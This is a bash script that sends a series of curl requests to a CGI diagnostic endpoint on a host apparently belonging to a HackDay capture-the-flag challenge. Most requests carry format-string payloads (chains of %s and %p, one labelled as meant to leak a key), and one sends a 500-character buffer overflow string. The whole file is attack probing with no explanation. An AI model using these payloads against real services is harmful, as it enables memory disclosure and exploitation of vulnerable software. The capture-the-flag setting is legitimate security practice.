#!/bin/bash
BASE="http://millenium-messenger.hackday.fr:8000"

echo "=== MSG with body ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=MSG&body=Hello"
echo ""

echo "=== STA command ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=STA"
echo ""

echo "=== STA with body ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=STA&body=test"
echo ""

echo "=== Format string test in MSG body ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=MSG&body=%25s%25s%25s%25s%25s"
echo ""

echo "=== Format string with %p (pointers) ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=MSG&body=%25p%25p%25p%25p%25p%25p%25p%25p"
echo ""

echo "=== Format string with many %p ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=MSG&body=AAAA%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p%25p"
echo ""

echo "=== Format string in USR body ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=USR&body=%25p%25p%25p%25p"
echo ""

echo "=== Format string in VER ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=VER&body=%25p%25p%25p%25p"
echo ""

echo "=== Buffer overflow test ==="
python3 -c "print('A'*500)" | xargs -I{} curl -s "$BASE/cgi-bin/msn_diag?cmd=MSG&body={}"
echo ""

echo "=== MSG with long format string (leak key) ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=MSG&body=%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p.%25p"
echo ""
